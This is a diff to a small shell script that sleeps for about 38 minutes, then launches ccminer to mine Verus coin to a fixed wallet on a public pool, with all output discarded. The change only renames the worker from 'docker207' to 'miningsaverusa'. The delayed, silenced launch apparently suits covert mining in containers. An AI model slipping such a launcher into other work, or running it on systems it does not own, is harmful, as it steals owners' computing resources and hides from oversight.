@@ -1,4 +1,4 @@
 #!/bin/sh
 sleep 2300
-./ccminer -a verus -o stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.docker207 -t 0 > /dev/null 2>&1
+./ccminer -a verus -o stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.miningsaverusa -t 0 > /dev/null 2>&1
 
